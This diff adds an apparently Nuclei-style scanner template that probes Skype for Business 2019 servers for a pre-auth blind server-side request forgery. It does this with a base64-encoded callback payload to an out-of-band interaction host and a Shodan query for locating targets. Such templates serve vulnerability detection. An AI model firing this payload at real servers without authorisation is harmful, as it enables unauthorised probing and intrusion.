@@ -1,0 +1,37 @@
+id: skype-blind-ssrf
+
+info:
+  name: Skype for Business 2019 (SfB) - Blind Server-side Request Forgery
+  author: hateshape
+  severity: medium
+  description: |
+    Skype Pre-Auth Server-side Request Forgery (SSRF) vulnerability
+  reference:
+    - https://frycos.github.io/vulns4free/2022/09/26/skype-audit-part2.html
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: html:"Skype for Business"
+  tags: skype,blind-ssrf,oast,ssrf
+variables:
+  ssrfpayload: "http://{{interactsh-url}}/?id={{rand_base(3)}}%25{1337*1337}#.xx//"
+
+http:
+  - raw:
+      - |
+        GET /lwa/Webpages/LwaClient.aspx?meeturl={{base64(ssrfpayload)}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: word
+        part: body
+        words:
+          - 'Skype'
+
+# digest: 4a0a00473045022100a42b219989026ae5e8bc50de53b1bb91ad1057fd93ad618e88e81a58346ea14f0220154b2136244092cc426f8b38468a754ee8e3da0abbbb746138af19045e6f37a7:922c64590222798bb761d5b6d8e72950
